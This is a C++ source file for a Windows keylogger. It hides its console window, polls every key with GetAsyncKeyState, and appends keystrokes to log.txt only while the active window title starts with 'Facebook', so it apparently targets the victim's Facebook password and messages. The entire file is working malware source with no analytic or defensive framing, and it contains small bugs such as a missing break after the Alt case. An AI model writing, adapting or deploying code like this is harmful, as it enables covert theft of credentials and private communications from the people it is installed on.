#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <string>
#include <tchar.h>
using namespace std;
using std::string;
bool in_facebook();
void add_key(char c);
void keylogger();
int main(){
     ShowWindow(GetConsoleWindow(), SW_HIDE);//hide the windows console while the program run
	 keylogger();
    return(0);
}
//functions

// check if the user is in facebook
bool in_facebook(){
        // get the active windowtitle
		char title[1024];
		HWND hwndHandle = GetForegroundWindow();
		GetWindowText(hwndHandle, title, 1023);
        //get the title
        string s="";
        for (int i=0;i<8;i++){
            s+=title[i];
        }
        if (s=="Facebook"){
            return(true);
        }else{
            return(false);
        }

}
void add_key(char c){
	 ofstream log;
     log.open("log.txt", ios::app);
	 switch (c) {
                    case VK_BACK:
                        log << "[backspace]";
                        break;
                    case VK_RETURN:
                        log << "[enter]";
                        break;
                    case VK_SHIFT:
                        log << "[shift]";
                        break;
                    case VK_CONTROL:
                        log << "[control]";
                        break;
                    case VK_CAPITAL:
                        log << "[cap]";
                        break;
                    case VK_TAB:
                        log << "[tab]";
                        break;
                    case VK_MENU:
                        log << "[alt]";
                    case VK_LBUTTON:
                    case VK_RBUTTON:
                        break;
                    case VK_NUMPAD0:
                        log << "0";
				        break;
                    case VK_NUMPAD1:
                        log << "1";
				        break;
			        case VK_NUMPAD2:
				        log << "2";
				        break;
			        case VK_NUMPAD3:
				        log << "3";
				        break;
			        case VK_NUMPAD4:
				        log << "4";
				        break;
			        case VK_NUMPAD5:
				        log << "5";
				        break;
			        case VK_NUMPAD6:
				        log << "6";
				        break;
			        case VK_NUMPAD7:
				        log << "7";
				        break;
			        case VK_NUMPAD8:
				        log << "8";
				        break;
			        case VK_NUMPAD9:
				        log << "9";
				        break;
                    default:
                        log << c;
                }
			log.close();
}

void keylogger(){
	char c;
    while (true) {
        for(c=1;c<=254;c++){
            if(GetAsyncKeyState(c) &  in_facebook() ) //check if c is taped in facebook
            {
                add_key(c);
            }
        }
    }
}
